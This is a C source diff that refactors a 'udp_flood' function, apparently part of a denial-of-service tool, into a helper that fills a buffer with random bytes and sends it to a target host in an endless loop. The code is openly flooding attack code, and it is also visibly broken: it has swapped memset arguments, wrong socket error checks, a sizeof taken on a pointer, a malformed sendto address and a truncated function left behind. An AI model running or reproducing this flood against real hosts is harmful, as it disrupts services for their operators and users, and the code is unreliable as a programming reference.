@@ -63,26 +63,41 @@ void udp_flood(arguments args) {
 	conn->c4->addr->sin_port = htons(args.port.n);
 	memset(&conn->c4->addr->sin_addr, sizeof(conn->c4->addr->sin_addr), 0);
 
-	conn->c4->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-	if (!conn->c4->sock) {
-		conn_free(conn, args.host_type);
-		INFOEE("Could not create the upd socket");
+}
+
+typedef int udp_err_t;
+
+static udp_err_t ipv4(conn4_t *conn)
+{
+	if (!conn)
+		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");
+
+	conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (!conn->sock) {
+		WSTATUS("Could not create the upd socket");
+		return -1;
 	}
 
-	conn->c4->buff = xzmalloc(PK_SIZE * sizeof(conn->c4->buff));
+	// fill up the buffer with random data.
+	conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff));
 	for(int i=0; i<PK_SIZE; i++) {
-		urandom_bytes(&conn->c4->buff[i], sizeof(conn->c4->buff[i]));
+		urandom_bytes(&conn->buff[i], sizeof(conn->buff[i]));
 	}
+
 	//TODO
 	ssize_t n = 0;
 	for(;;) {
-		n = sendto(conn->c4->sock,conn->c4->buff, PK_SIZE*sizeof(conn->c4->buff),
-				0, (SA*)&conn->c4->addr->sin_addr, sizeof(conn->c4->addr->sin_addr));
-		if (!n) {
+		n = sendto(conn->sock,conn->buff, PK_SIZE*sizeof(conn->buff),
+					0, (SA*)&conn->addr->sin_addr, sizeof(conn->addr->sin_addr));
+		if (!n) { // if any error is cought break from
 			break;
 		}
 	}
+	
+	// todo	
+	return 0;
 }
+
 
 
 
